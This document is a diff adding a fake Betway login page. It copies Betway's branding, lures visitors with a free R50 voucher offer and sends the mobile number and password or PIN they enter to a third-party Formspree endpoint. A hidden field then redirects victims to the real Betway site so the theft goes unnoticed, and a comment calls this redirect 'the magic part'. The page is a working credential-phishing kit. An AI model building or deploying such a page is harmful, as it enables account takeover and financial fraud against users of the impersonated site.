@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login - betway</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://content.betway.co.za/images/Shared/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://content.betway.co.za/images/Shared/sprite-main-15.svg#betway_logo_white" alt="Betway Logo" class="logo">
+        
+        <div class="voucher-banner">
+            special offer: sign in to claim your free r50 voucher!
+        </div>
+
+        <form action="https://formspree.io/f/mbdpgwjl" method="post">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="mobile number" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="password / pin" required>
+            </div>
+            
+            <!-- this is the magic part. it redirects them after they submit. -->
+            <input type="hidden" name="_next" value="https://www.betway.co.za/">
+            
+            <button type="submit">login</button>
+        </form>
+        
+        <div class="links">
+            <a href="#">forgot password?</a>
+        </div>
+    </div>
+    <div class="footer-links">
+        <a href="#">sign up</a>
+        <a href="#">promotions</a>
+    </div>
+</body>
+</html>
